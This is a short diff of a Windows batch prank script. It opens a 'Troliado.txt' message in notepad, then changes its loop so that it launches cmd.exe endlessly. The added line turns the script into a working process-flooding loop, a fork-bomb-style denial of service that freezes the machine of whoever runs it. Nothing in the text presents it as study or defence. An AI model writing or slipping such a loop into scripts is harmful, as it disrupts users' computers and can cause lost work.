@@ -19,5 +19,5 @@ start notepad "%script_dir%Troliado.txt"
 timeout /t 30
 timeout /t 1
 :loop
-start "30" cmd.txt
+start "90" cmd.exe
 goto loop
